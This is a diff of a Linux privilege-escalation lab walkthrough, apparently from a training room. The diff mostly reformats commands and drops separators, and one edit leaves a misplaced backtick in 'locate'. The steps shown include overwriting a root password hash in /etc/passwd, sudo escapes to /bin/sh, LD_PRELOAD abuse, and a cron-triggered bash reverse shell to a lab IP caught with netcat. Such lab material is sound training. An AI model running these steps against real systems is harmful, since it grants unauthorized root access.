@@ -196,22 +196,25 @@ The /etc/passwd file contains information about user accounts. It is world-reada
 
 Note that the /etc/passwd file is world-writable:
 
-ls -l /etc/passwd
+`ls -l /etc/passwd`
+
 
 Generate a new password hash with a password of your choice:
 
-openssl passwd newpasswordhere
+`openssl passwd newpasswordhere`
+
 
 Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
 
 Switch to the root user, using the new password:
 
-su root
+`su root`
+
 Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
 
 Now switch to the newroot user, using the new password:
 
-su newroot
+`su newroot`
 
 Remember to exit out of the root shell before continuing!
 
@@ -242,13 +245,9 @@ root@debian:/home/user#
 
 ```
 
-
-
-===
-
 List the programs which sudo allows your user to run:
 
-sudo -l
+`sudo -l`
 
 Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
 
@@ -297,13 +296,11 @@ find . -exec /bin/sh \; -quit
 ```
 
 
-===
-
 Sudo can be configured to inherit certain environment variables from the user's environment.
 
 Check which environment variables are inherited (look for the env_keep options):
 
-sudo -l
+`sudo -l`
 
 LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
 
@@ -384,8 +381,6 @@ Remember to exit out of the root shell before continuing!
 Answer the questions below
 Read and follow along with the above.
 
-
-====
 Cron Jobs - File Permissions
 
 Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
@@ -430,11 +425,11 @@ There should be two cron jobs scheduled to run every minute. One runs overwrite.
 
 Locate the full path of the overwrite.sh file:
 
-locate overwrite.sh
+l`ocate overwrite.sh`
 
 Note that the file is world-writable:
 
-ls -l /usr/local/bin/overwrite.sh
+`ls -l /usr/local/bin/overwrite.sh`
 
 ```
 
@@ -466,7 +461,7 @@ bash -i >& /dev/tcp/10.2.77.171/4444 0>&1
 
 Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
 
-nc -nvlp 4444
+`nc -nvlp 4444`
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -492,7 +487,7 @@ exit
 
 ```
 
-===
+
 Cron Jobs - PATH Environment Variable
 
 View the contents of the system-wide crontab:
